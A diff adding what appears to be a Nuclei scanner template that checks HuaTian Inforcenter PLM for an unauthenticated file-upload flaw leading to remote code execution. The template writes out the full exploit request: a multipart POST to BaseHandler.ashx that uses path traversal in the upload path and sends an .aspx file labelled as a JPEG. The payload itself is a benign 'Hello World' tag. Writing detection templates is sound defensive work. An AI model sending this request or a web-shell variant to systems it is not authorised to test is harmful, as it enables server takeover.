@@ -1,0 +1,39 @@
+id: HuaTianInforcenterPLM-BaseHandler-uploadToRce
+
+info:
+  name: HuaTianInforcenterPLM-BaseHandler-uploadToRce
+  author: iSee857
+  severity: critical
+  description: HuaTianInforcenterPLM-BaseHandler-uploadToRce
+  reference:
+    - https://example.com/vuln-details
+  tags: file-upload,aspx,rce
+
+http:
+  - raw:
+      - |
+        POST /Base/BaseHandler.ashx?type=uploadFileToIIS&uploadPath=../Files/ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTxlvAiDA82bSOF0h
+        Accept-Encoding: gzip, deflate
+
+        ------WebKitFormBoundaryTxlvAiDA82bSOF0h
+        Content-Disposition: form-data; name="file"; filename="hello.aspx"
+        Content-Type: image/jpeg
+
+        <%= "Hello World1!" %>
+        ------WebKitFormBoundaryTxlvAiDA82bSOF0h--
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - ".aspx"
+          - "src"
+          - "hello.aspx"
+        condition: and
+        part: body
